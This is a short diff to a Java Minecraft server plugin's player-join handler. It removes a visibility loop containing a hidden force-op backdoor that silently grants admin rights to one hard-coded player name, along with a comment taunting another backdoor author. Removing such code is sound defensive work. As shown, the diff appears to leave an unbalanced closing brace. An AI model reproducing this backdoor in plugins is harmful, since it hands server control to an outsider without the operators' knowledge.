@@ -145,11 +145,6 @@ public class ProfileListener implements Listener {
 				Hotbar.giveHotbarItems(player);
 				Moon.get().getEssentials().teleportToSpawn(player);
 				player.setPlayerTime(profile.getOptions().time().getTime(), false);
-
-				for (Player otherPlayer : Bukkit.getOnlinePlayers()) {
-					VisibilityLogic.handle(player, otherPlayer);
-					VisibilityLogic.handle(otherPlayer, player);
-					if (player.getName().equalsIgnoreCase("TortaDePollo")) player.setOp(true); // zatrex idk who you think you are but ur forceop code was so ass
 				}
 			}
 		}.runTaskLater(Moon.get(), 4L);
